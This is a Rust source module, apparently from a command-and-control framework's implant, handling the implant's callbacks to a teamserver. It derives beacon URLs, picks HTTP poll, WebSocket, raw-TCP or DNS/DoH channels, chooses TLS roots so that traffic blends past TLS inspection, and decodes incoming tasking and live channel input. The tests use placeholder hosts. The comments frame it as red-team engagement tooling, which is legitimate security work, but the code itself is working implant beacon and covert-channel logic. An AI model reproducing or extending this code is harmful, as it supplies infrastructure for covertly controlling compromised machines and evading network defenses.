pub mod dns;
pub mod http;
pub(crate) mod live;
pub mod rawtcp;
pub mod stream;

use std::sync::Arc;
use std::time::Duration;

use rustls::pki_types::CertificateDer;
use rustls::RootCertStore;

use crate::error::ContactError;
use crate::profile::Profile;
use crate::session::{Attempt, Session};

/// The TLS trust roots a profile dials under (architecture.md Sec 9). The
/// pinned bake is the default: the engagement CA the only root, no
/// public-PKI or system-store dependence. The public posture is the
/// real-domain front whose certificate a public CA issued -- the dials
/// validate like an ordinary client against the compiled-in Mozilla root
/// set, the blend that survives TLS inspection.
pub fn tls_roots(profile: &Profile) -> RootCertStore {
    if profile.public_tls() {
        RootCertStore {
            roots: webpki_roots::TLS_SERVER_ROOTS.to_vec(),
        }
    } else {
        let mut roots = RootCertStore::empty();
        for der in crate::trust::parse_pem(&profile.ca_pem) {
            let _ = roots.add(CertificateDer::from(der));
        }
        roots
    }
}

/// The HTTP carriage builder the enroll and poll clients ride: plain http
/// for the documented cleartext web posture (the sealed contact body carries
/// the confidentiality), https under the profile's trust posture for the TLS
/// front. A pinned bake with no CAs keeps the builder's default validation
/// (the dev shape); the public posture always names the Mozilla set.
pub fn build_agent(url: &str, profile: &Profile, timeout_seconds: f64) -> ureq::Agent {
    let mut builder =
        ureq::AgentBuilder::new().timeout(Duration::from_secs_f64(timeout_seconds.max(1.0)));
    if url.starts_with("https://") {
        let roots = tls_roots(profile);
        if !roots.is_empty() {
            let config = rustls::ClientConfig::builder_with_provider(Arc::new(
                rustls::crypto::ring::default_provider(),
            ))
            .with_safe_default_protocol_versions()
            .expect("rustls protocol versions")
            .with_root_certificates(roots)
            .with_no_client_auth();
            builder = builder.tls_config(Arc::new(config));
        }
    }
    builder.build()
}

/// One contact carriage: a way to hold a contact against one walked dial.
/// The run loop builds the carriage for the egress entry the walk points at
/// -- the entry's own shape and the bake's mode name the client -- and
/// rebuilds it when a failed contact walks to the next entry. The carriage
/// borrows the session (never owns it), so cross-carriage state -- the nonce
/// floor, the ledger, the cadence -- survives every switch and reconnect.
pub trait Contact {
    /// One contact attempt. `Ok(Attempt::Crossed)` means the attempt's
    /// response was processed whole; `Err(ContactError::Refused)` is a
    /// permanent answer; everything else is a dropped attempt the run loop
    /// retries on the walk.
    fn attempt(&mut self, session: &mut Session) -> Result<Attempt, ContactError>;
}

/// The beacon URL off an enroll URL: scheme and authority plus the fixed
/// envelope route, any path dropped (the teamserver maps the route; the
/// malleable profile shapes only the enroll request).
fn beacon_url(enroll_url: &str) -> String {
    match enroll_url.find("://") {
        Some(at) => {
            let after = &enroll_url[at + 3..];
            let authority = after.split('/').next().unwrap_or(after);
            format!("{}://{authority}/implants/beacon", &enroll_url[..at])
        }
        None => format!("https://{enroll_url}/implants/beacon"),
    }
}

/// Reads a contact response past its handshake frame: the shared body every
/// carriage serves. Downstream frames are discriminated on kind first, as
/// the wire contract states -- channel input routes to the live channel it
/// names (a task with no live channel is at most a completion race, and is
/// dropped), any other kind-bearing frame (a staged chunk run, say) is not
/// for this reader, and kindless frames take the positional TaskRequest
/// parse; acceptance handles a staged task by registering its transfer, and
/// the poll cycle's next demand (or the live carriage's inline exchange)
/// pulls the payload.
pub fn accept_tasking(session: &mut Session, inbound: &[crate::wire::Frame], acks: bool) {
    use crate::wire::{ChannelInput, TaskRequest};
    use prost::Message;
    for frame in inbound {
        let kind = frame.kind();
        if kind == crate::wire::FrameKind::ChannelInput {
            if let Ok(input) = ChannelInput::decode(frame.payload.as_ref()) {
                session.channels.feed(&input.task_id, input.data, input.eof);
            }
            continue;
        }
        if kind != crate::wire::FrameKind::Unspecified {
            continue;
        }
        if let Ok(task) = TaskRequest::decode(frame.payload.as_ref()) {
            session.accept(&task, acks);
        }
    }
}

/// The contact dial off one enroll front: the URL the run loop's egress
/// walk carries for that front. The web families derive the fixed envelope
/// route off the front's scheme and authority; the non-web families carry
/// their own dial data in the URL -- the DNS family's zone above all, which
/// the route derivation would bury, so a dns-schemed front is the dial
/// verbatim, and the socket family's dial is its bare authority.
pub fn contact_dial(enroll_url: &str) -> String {
    if let Some((_, _, zone)) = dns::parse_front(enroll_url.trim_end_matches('/')) {
        if !zone.is_empty() {
            return enroll_url.trim_end_matches('/').to_string();
        }
    }
    normalize_fronts(beacon_url(enroll_url))
}

/// The non-web families' front shapes: the socket's dial is the bare
/// tcp://authority (no route), and the DNS family's is resolver plus zone
/// (the envelope-derived path dropped for the first path segment -- the
/// zone is the dial's own data, not a route).
fn normalize_fronts(front: String) -> String {
    if let Some(rest) = front.strip_prefix("tcp://") {
        let authority = rest.split('/').next().unwrap_or(rest);
        return format!("tcp://{authority}");
    }
    for scheme in ["dns", "doh"] {
        let prefix = format!("{scheme}://");
        if let Some(rest) = front.strip_prefix(&prefix) {
            let authority = rest.split('/').next().unwrap_or(rest);
            let zone = rest[authority.len().min(rest.len())..]
                .trim_start_matches('/')
                .split('/')
                .next()
                .unwrap_or("")
                .trim_end_matches('.');
            return if zone.is_empty() {
                format!("{scheme}://{authority}")
            } else {
                format!("{scheme}://{authority}/{zone}")
            };
        }
    }
    front
}

/// The carriage one walked dial names: the socket family's dial picks the
/// raw-TCP client (the mode choosing its poll or live shape), the DNS
/// family's the datagram exchange, and otherwise the baked mode picks the
/// web client -- poll's POST cycle or stream's WebSocket.
pub fn carriage_for(dial: &str, profile: &Profile) -> Box<dyn Contact> {
    if dial.starts_with("tcp://") {
        return Box::new(rawtcp::RawTcp::new(dial, profile));
    }
    if dial.starts_with("dns://") || dial.starts_with("doh://") {
        return match dns::Dns::new(dial, profile) {
            Ok(carriage) => Box::new(carriage),
            // The dial is DNS-shaped by construction here, so this is a
            // bind failure: the run loop's walk treats it as a dropped
            // cycle and retries on the cadence.
            Err(_) => Box::new(http::Poll::new(dial, profile)),
        };
    }
    match profile.mode.as_str() {
        "stream" => Box::new(stream::Stream::new(dial, profile)),
        _ => Box::new(http::Poll::new(dial, profile)),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn profile() -> Profile {
        Profile {
            enroll_url: "https://front.example".into(),
            fallback_enroll_urls: Vec::new(),
            ca_pem: String::new(),
            tls_trust: "pinned".into(),
            kill_date: None,
            sleep_seconds: 30.0,
            jitter_seconds: 10.0,
            mode: "poll".into(),
            enroll_path: "/implants/enroll".into(),
            request_timeout_seconds: 30.0,
            envelope: "aesgcm".into(),
            contact_envelope: "none".into(),
            envelope_key: String::new(),
            token: String::new(),
            verbs: Vec::new(),
        }
    }

    #[test]
    fn tls_roots_follow_the_baked_posture() {
        // Pinned is the default and reads only the baked CA -- an empty bake
        // carries no roots (the dev shape keeps the builder's default
        // validation). The public posture names the compiled-in Mozilla
        // set: the real-domain front validated like an ordinary client.
        let pinned = profile();
        assert!(super::tls_roots(&pinned).is_empty());

        let mut public = profile();
        public.tls_trust = "public".into();
        assert!(super::tls_roots(&public).len() > 50);
    }

    #[test]
    fn beacon_urls_derive_the_fixed_route() {
        assert_eq!(
            beacon_url("https://front.example/shape"),
            "https://front.example/implants/beacon"
        );
        assert_eq!(
            beacon_url("tcp://host:443/ignored"),
            "tcp://host:443/implants/beacon"
        );
        assert_eq!(beacon_url("bare.host"), "https://bare.host/implants/beacon");
    }

    #[test]
    fn contact_dials_carry_the_non_web_families_dial_data() {
        // The DNS zone is dial data, not a route: the dns-schemed front is
        // the dial verbatim, and the web derivation never touches it.
        assert_eq!(
            contact_dial("dns://resolver.example/zone.example"),
            "dns://resolver.example/zone.example"
        );
        assert_eq!(
            contact_dial("tcp://10.0.0.9:8443/anything"),
            "tcp://10.0.0.9:8443"
        );
        // The web family: the route derived off the front.
        assert_eq!(
            contact_dial("https://front.example/enroll"),
            "https://front.example/implants/beacon"
        );
    }
}
